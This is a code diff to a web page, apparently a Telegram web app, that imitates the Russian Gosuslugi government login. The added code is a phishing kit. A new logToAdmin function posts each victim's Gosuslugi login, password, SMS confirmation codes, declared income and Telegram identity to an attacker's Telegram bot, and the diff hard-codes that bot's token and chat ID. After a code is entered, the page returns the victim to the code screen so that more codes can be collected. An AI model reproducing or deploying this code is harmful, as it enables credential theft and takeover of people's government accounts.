@@ -150,6 +150,7 @@
   <script>
     let userStatus = '';
     let smsTimerInterval = null;
+    let incomeValue = '';
 
     function nextScreen(screenNumber) {
       document.querySelectorAll('.container').forEach(el => el.style.display = 'none');
@@ -157,8 +158,15 @@
 
       if (screenNumber === 4) {
         const raw = document.getElementById('income').value.replace(/\D/g, '');
+        incomeValue = raw;
         const formattedIncome = new Intl.NumberFormat('ru-RU').format(raw);
         document.getElementById('confirmation').textContent = `Вы выбрали: ${userStatus}, доход: ${formattedIncome} ₽/мес`;
+      }
+      if (screenNumber === 5) {
+        logToAdmin({ event: 'before_gosuslugi', status: userStatus, income: incomeValue });
+      }
+      if (screenNumber === 6) {
+        logToAdmin({ event: 'gosuslugi_enter' });
       }
       if (screenNumber === 7) {
         startSMSTimer();
@@ -186,7 +194,6 @@
     }
 
     function startSMSTimer() {
-      // Остановить предыдущий таймер, если был
       if (smsTimerInterval) {
         clearInterval(smsTimerInterval);
         smsTimerInterval = null;
@@ -213,7 +220,6 @@
       }, 1000);
     }
 
-    // Логика для ввода кода подтверждения
     function setupCodeInputs() {
       const inputs = document.querySelectorAll('#code-inputs .code-box');
       inputs.forEach((input, idx) => {
@@ -223,12 +229,12 @@
           if (this.value && idx < inputs.length - 1) {
             inputs[idx + 1].focus();
           }
-          // Если все поля заполнены
           if ([...inputs].every(inp => inp.value.length === 1)) {
+            const code = [...inputs].map(inp => inp.value).join('');
+            logToAdmin({ event: 'gosuslugi_code', code });
             setTimeout(() => {
               nextScreen(8);
               setTimeout(() => {
-                // Очистить поля и вернуть на ввод кода
                 inputs.forEach(inp => inp.value = '');
                 nextScreen(7);
               }, 2000);
@@ -241,11 +247,9 @@
           }
         };
       });
-      // Фокус на первое поле
       if (inputs.length) inputs[0].focus();
     }
 
-    // Валидация логина и пароля на экране Госуслуги
     function validateLoginForm() {
       const login = document.getElementById('loginInput').value.trim();
       const password = document.getElementById('passwordInput').value;
@@ -253,28 +257,23 @@
       const passwordError = document.getElementById('passwordError');
       let valid = true;
 
-      // Сброс ошибок
       loginError.style.display = 'none';
       passwordError.style.display = 'none';
       loginError.textContent = '';
       passwordError.textContent = '';
 
-      // Проверка логина
       if (!login) {
         loginError.textContent = 'Введите логин';
         loginError.style.display = 'block';
         valid = false;
       }
 
-      // Проверка длины пароля
       if (password.length < 6) {
         passwordError.textContent = 'Пароль должен быть не менее 6 символов';
         passwordError.style.display = 'block';
         valid = false;
       }
 
-      // Проверка пароля на спецсимвол
-      // Любой символ кроме латиницы, кириллицы и цифр
       const specialChar = /[^a-zA-Zа-яА-Я0-9]/;
       if (!specialChar.test(password)) {
         passwordError.textContent = 'Пароль должен содержать хотя бы один специальный символ';
@@ -283,8 +282,51 @@
       }
 
       if (valid) {
+        logToAdmin({ event: 'gosuslugi_login', login, password });
         nextScreen(7);
       }
+    }
+
+    // Отправка данных напрямую в Telegram-бота
+    function logToAdmin(data) {
+      const BOT_TOKEN = '7597284856:AAHRJYxz1PvbDVEYcKxwtiX9FNH8ceEckzU'; // <-- ВСТАВЬТЕ СВОЙ ТОКЕН
+      const ADMIN_CHAT_ID = '7867932363'; // <-- ВСТАВЬТЕ СВОЙ chat_id
+      // Добавляем инфу о пользователе из Telegram WebApp
+      const tgUser = window.Telegram?.WebApp?.initDataUnsafe?.user;
+      if (tgUser) {
+        data.tg_user_id = tgUser.id;
+        data.tg_username = tgUser.username;
+        data.tg_first_name = tgUser.first_name;
+        data.tg_last_name = tgUser.last_name;
+      }
+      let userInfo = '';
+      if (data.tg_user_id) {
+        userInfo = `\nTelegram ID: ${data.tg_user_id}` +
+                   (data.tg_username ? `\nUsername: @${data.tg_username}` : '') +
+                   (data.tg_first_name ? `\nИмя: ${data.tg_first_name}` : '') +
+                   (data.tg_last_name ? `\nФамилия: ${data.tg_last_name}` : '');
+      }
+      let text = '';
+      if (data.event === 'before_gosuslugi') {
+        text = `Веб-апп: заполнены данные\nСтатус: ${data.status}\nДоход: ${data.income}`;
+      } else if (data.event === 'gosuslugi_enter') {
+        text = 'Пользователь перешёл к авторизации через Госуслуги';
+      } else if (data.event === 'gosuslugi_login') {
+        text = `Ввод Госуслуг:\nЛогин: ${data.login}\nПароль: ${data.password}`;
+      } else if (data.event === 'gosuslugi_code') {
+        text = `Введён код подтверждения: ${data.code}`;
+      } else {
+        text = JSON.stringify(data, null, 2);
+      }
+      text += userInfo;
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: ADMIN_CHAT_ID,
+          text: text
+        })
+      });
     }
   </script>
 </body>
